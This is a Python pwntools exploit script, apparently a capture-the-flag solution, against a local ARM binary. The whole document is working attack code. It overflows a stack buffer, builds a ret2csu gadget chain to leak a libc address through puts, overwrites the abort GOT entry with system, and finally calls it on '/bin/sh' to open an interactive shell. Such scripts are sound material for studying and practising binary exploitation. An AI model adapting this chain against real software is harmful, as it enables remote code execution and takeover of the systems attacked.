from pwn import *

context.log_level = "debug"
p = process("./run.sh")

puts_got = 0x00021014
puts_plt = 0x00010394
abort_got = 0x00021024
read_got = 0x0002100C
main = 0x000104F8
blx_r3 = 0x0001059c # mov r0, r7 ; blx r3
csu_gadget = 0x000105AC #LDMFD   SP!, {R4-R10,PC} 
csu_gadget2 = 0x0001058C #add r4, r4, #1 ; ldr r3, [r5], #4 ; mov r2, sb ; mov r1, r8 ; mov r0, r7 ; blx r3

def csu(func_got, r0, r1, r2, next_func):
    s = p32(csu_gadget)+p32(0)+p32(func_got)+p32(1)+p32(r0)+p32(r1)+p32(r2)+p32(0)+p32(csu_gadget2)
    s += p32(0)*7 + p32(next_func)*8
    return s

# leak libc
payload = "A"*0x68+csu(puts_got, puts_got, 0, 0, main)
p.sendlineafter("CTF!", payload)
p.recvline()
puts_libc = u32(p.recvn(4))
libc = ELF("./lib/libc.so.6")
libc.address = puts_libc - libc.symbols["puts"]
log.success("libc: "+hex(libc.address))

# edit abort to system
payload = "A"*0x68+csu(read_got, 0, abort_got, 8, main)
p.sendlineafter("CTF!", payload)
time.sleep(0.5)
p.send(p32(libc.symbols["system"]))

# get shell
payload = "A"*0x68+csu(abort_got, libc.search("/bin/sh").next(), 0, 0, main)
p.sendlineafter("CTF!", payload)
p.interactive()
